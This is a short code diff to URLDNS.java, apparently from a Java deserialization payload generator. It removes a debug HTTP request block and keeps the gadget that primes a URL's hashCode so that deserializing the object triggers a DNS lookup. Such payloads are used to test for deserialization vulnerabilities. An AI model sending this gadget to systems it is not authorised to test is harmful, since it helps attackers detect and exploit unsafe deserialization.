@@ -58,14 +58,7 @@ public class URLDNS implements ObjectPayload<Object> {
                 ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
 
                 Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
-                //adding me
-                URL obj = new URL(url);
-		        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-		        con.setRequestMethod("GET");
-		        con.setRequestProperty("User-Agent", "Mozilla-Firefox");
-		        int responseCode = con.getResponseCode();
-                //add complete
-
+                
                 return ht;
         }
 
